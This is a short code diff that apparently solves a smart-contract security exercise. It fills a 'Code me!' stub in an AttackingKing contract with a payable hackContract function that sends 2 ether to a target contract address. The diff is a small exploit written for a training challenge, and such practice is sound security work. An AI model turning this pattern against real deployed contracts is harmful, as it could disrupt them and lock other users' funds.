@@ -10,7 +10,7 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
-        // Code me!
+    function hackContract() external payable {
+        address(contractAddress).call{value: 2 ether}("");
     }
 }
